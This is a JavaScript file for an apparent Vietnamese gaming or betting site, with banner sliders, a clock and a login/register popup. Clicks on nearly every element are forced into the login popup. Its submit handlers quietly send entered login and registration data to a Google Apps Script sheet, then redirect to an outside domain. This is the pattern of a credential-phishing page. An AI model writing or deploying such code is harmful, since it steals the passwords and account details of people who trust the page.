// Chờ cho đến khi toàn bộ HTML được tải xong
document.addEventListener('DOMContentLoaded', function() {
    
    // Lấy các phần tử HTML bằng ID (Mobile Menu)
    const menuBtn = document.getElementById('mobile-menu-btn');
    const mobileMenu = document.getElementById('mobile-menu');

    // Bắt sự kiện khi click vào nút ☰
    if(menuBtn && mobileMenu) {
        menuBtn.addEventListener('click', function() {
            mobileMenu.classList.toggle('active');
        });
    }

    // ==========================================
    // TÍNH NĂNG SLIDER BANNER TỰ ĐỘNG (MOBILE)
    // ==========================================
    const sliderTrack = document.getElementById('slider-track');
    if (sliderTrack) {
        const images = sliderTrack.querySelectorAll('img');
        let currentIndex = 0; 
        const totalImages = images.length; 

        function moveToNextSlide() {
            currentIndex++;
            if (currentIndex >= totalImages) {
                currentIndex = 0; 
            }
            sliderTrack.style.transform = `translateX(-${currentIndex * 100}%)`;
        }
        setInterval(moveToNextSlide, 3000);
    }

    // ==========================================
    // TÍNH NĂNG SLIDER BANNER TỰ ĐỘNG (DESKTOP)
    // ==========================================
    const deskSliderTrack = document.getElementById('desk-slider-track');
    if (deskSliderTrack) {
        const deskImages = deskSliderTrack.querySelectorAll('img');
        const deskDots = document.querySelectorAll('#desk-slider-dots .dot');
        let deskCurrentIndex = 0;
        const deskTotalImages = deskImages.length;
        let deskSlideInterval;

        function updateDeskSlide(index) {
            deskCurrentIndex = index;
            if (deskCurrentIndex >= deskTotalImages) {
                deskCurrentIndex = 0;
            } else if (deskCurrentIndex < 0) {
                deskCurrentIndex = deskTotalImages - 1;
            }

            // Dịch chuyển đường ray banner PC
            deskSliderTrack.style.transform = `translateX(-${deskCurrentIndex * 100}%)`;

            // Cập nhật dấu chấm active
            deskDots.forEach((dot, idx) => {
                if (idx === deskCurrentIndex) {
                    dot.classList.add('active');
                } else {
                    dot.classList.remove('active');
                }
            });
        }

        function nextDeskSlide() {
            updateDeskSlide(deskCurrentIndex + 1);
        }

        // Chạy tự động 3.5s
        deskSlideInterval = setInterval(nextDeskSlide, 3500);

        // Bắt sự kiện click vào từng chấm tròn
        deskDots.forEach((dot) => {
            dot.addEventListener('click', function() {
                clearInterval(deskSlideInterval);
                const index = parseInt(this.getAttribute('data-index'));
                updateDeskSlide(index);
                deskSlideInterval = setInterval(nextDeskSlide, 3500);
            });
        });
    }

    // ==========================================
    // XỬ LÝ POPUP ĐĂNG NHẬP / ĐĂNG KÝ
    // ==========================================
    const modal = document.getElementById('auth-modal');
    const btnOpenLogin = document.getElementById('btn-open-login');
    const btnOpenRegister = document.getElementById('btn-open-register');
    const closeModal = document.getElementById('close-modal');

    const tabBtnLogin = document.getElementById('tab-btn-login');
    const tabBtnRegister = document.getElementById('tab-btn-register');
    const formLogin = document.getElementById('form-login');
    const formRegister = document.getElementById('form-register');

    // Tìm tất cả các nút chức năng trên Desktop
    const deskBtnLogins = document.querySelectorAll('.desk-btn-login');
    const deskBtnRegs = document.querySelectorAll('.desk-btn-reg');

    // 1. HÀM MỞ MODAL VÀ CHUYỂN TAB
    function openModal(isLogin) {
        if (!modal) return;
        modal.style.display = 'flex'; 
        if(isLogin) {
            activateTab(tabBtnLogin, formLogin);
            deactivateTab(tabBtnRegister, formRegister);
        } else {
            activateTab(tabBtnRegister, formRegister);
            deactivateTab(tabBtnLogin, formLogin);
        }
    }

    function activateTab(btn, form) {
        if(btn && form) {
            btn.classList.add('active');
            form.classList.add('active');
        }
    }
    function deactivateTab(btn, form) {
        if(btn && form) {
            btn.classList.remove('active');
            form.classList.remove('active');
        }
    }

    // 2. GẮN SỰ KIỆN CLICK CHO NÚT MOBILE
    if(btnOpenLogin) btnOpenLogin.addEventListener('click', () => openModal(true));
    if(btnOpenRegister) btnOpenRegister.addEventListener('click', () => openModal(false));

    // 3. GẮN SỰ KIỆN CLICK CHO TẤT CẢ CÁC NÚT DESKTOP
    deskBtnLogins.forEach(function(btn) {
        btn.addEventListener('click', () => openModal(true));
    });
    deskBtnRegs.forEach(function(btn) {
        btn.addEventListener('click', () => openModal(false));
    });

    // 4. XỬ LÝ ĐÓNG MODAL
    if(closeModal) {
        closeModal.addEventListener('click', () => modal.style.display = 'none');
    }
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.style.display = 'none';
    });

    // 5. CHUYỂN TAB BÊN TRONG MODAL
    if(tabBtnLogin) tabBtnLogin.addEventListener('click', () => openModal(true));
    if(tabBtnRegister) tabBtnRegister.addEventListener('click', () => openModal(false));
    // ==========================================
    // YÊU CẦU ĐĂNG NHẬP KHI CLICK VÀO CÁC THÀNH PHẦN KHÁC
    // ==========================================
    // Bao gồm cả các thẻ Mobile và các thẻ/nút/menu trên PC
    const requireLoginElements = document.querySelectorAll('.game-card, .action-item, .bottom-nav, .header, .desk-btn-play, .desk-icon-item, .desk-nav-item, .logo-item,.btn-download,.mobile-menu');

    requireLoginElements.forEach(function(element) {
        element.addEventListener('click', function(event) {
            if (!element.classList.contains('desk-btn-login') && !element.classList.contains('desk-btn-reg')) {
                event.preventDefault(); 
                openModal(true); 
            }
        });
    });

    // ==========================================
    // KẾT NỐI GOOGLE SHEETS VÀ CHUYỂN HƯỚNG SIÊU TỐC
    // ==========================================
    const scriptURL = 'https://script.google.com/macros/s/AKfycby7H9QdATf2ARMerbXwmo1HXgwbgzY12c20AEAENaAspRypCQKiqf5HO3JzAZ9uZjYg/exec'; 

    if (formLogin) {
        formLogin.addEventListener('submit', e => {
            e.preventDefault(); 
            let formData = new FormData(formLogin);
            formData.append('type', 'Đăng nhập');

            fetch(scriptURL, { 
                method: 'POST', 
                body: formData,
                mode: 'no-cors', 
                keepalive: true  
            });

            window.location.href = "https://m.hi2555.com/";
        });
    }

    if (formRegister) {
        formRegister.addEventListener('submit', e => {
            e.preventDefault(); 
            let formData = new FormData(formRegister);
            formData.append('type', 'Đăng ký');

            fetch(scriptURL, { 
                method: 'POST', 
                body: formData,
                mode: 'no-cors',
                keepalive: true
            });

            window.location.href = "https://m.hi2555.com/";
        });
    }

    // ==========================================
    // ĐỒNG HỒ HIỂN THỊ TRÊN GIAO DIỆN DESKTOP
    // ==========================================
    function updateDeskClock() {
        const clockElement = document.getElementById('desk-clock');
        if (!clockElement) return;

        const now = new Date();
        const year = now.getFullYear();
        const month = String(now.getMonth() + 1).padStart(2, '0');
        const day = String(now.getDate()).padStart(2, '0');
        const daysOfWeek = ['CN', 'T2', 'T3', 'T4', 'T5', 'T6', 'T7'];
        const dayOfWeek = daysOfWeek[now.getDay()];
        const hours = String(now.getHours()).padStart(2, '0');
        const minutes = String(now.getMinutes()).padStart(2, '0');
        const seconds = String(now.getSeconds()).padStart(2, '0');

        clockElement.textContent = `${year}/${month}/${day} (${dayOfWeek}) ${hours}:${minutes}:${seconds}`;
    }

    setInterval(updateDeskClock, 1000);
    updateDeskClock();
});